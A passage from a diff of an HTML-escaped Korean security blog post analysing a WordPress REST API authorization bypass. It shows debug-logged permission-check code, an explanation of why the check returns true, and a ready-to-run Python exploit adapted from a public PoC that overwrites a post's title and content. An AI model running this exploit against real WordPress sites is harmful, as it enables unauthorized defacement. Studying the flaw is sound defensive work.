-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;var_export&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;var_export&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;var_export&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_assign_terms_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$log_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log_txt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_update_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_edit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to edit this post.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get_current_user_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'author'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;current_user_can&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;cap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;edit_others_posts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_edit_others'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to update posts as this user.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;current_user_can&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$post_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;cap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;edit_others_posts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_assign_sticky'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to make posts sticky.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;check_assign_terms_permission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$request&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;WP_Error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'rest_cannot_assign_term'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Sorry, you are not allowed to assign the provided terms.'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'status'&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rest_authorization_required_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;실제 Exploit Code를 실행하고 게시물의 내용이 변경되는 것을 확인한 후 실제 권한 체크를 하는 로직을 어떻게 우회가 가능한지 확인하기 위해 서버의 로그로 확인해보았습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x01_8.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;[그림 1-8]
-  update_item_permissions_check 로그 결과
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;실제 Exploit Code를 실행하면서 권한체크 부분에 대한 값들이 NULL과 true로 결과가 나오는 것을 확인하였으며 존재하지 않는 게시물, request 속성 값들이 NULL 인것을 확인하였고 if문 비교 피연산자들이 false 결과를 나타내며 권한체크 로직이 true의 결과가 나오는 것을 확인할 수 있었습니다.&lt;/p&gt;
-
-&lt;p&gt;Exploit-DB에 공개된 해당 취약점 POC코드를 분석하고 간단하게 커스텀마이징하여 아래와 같은 코드로 공격으로 사용할 수 있습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;                        &lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Title Input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content Input:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://IP/wordpress/index.php/wp-json/wp/v2/posts/4/?id=4abc&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;                       &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;'content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;application/json&quot;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;  &lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;패치 및 대응방안&lt;/strong&gt;
-&lt;br /&gt;
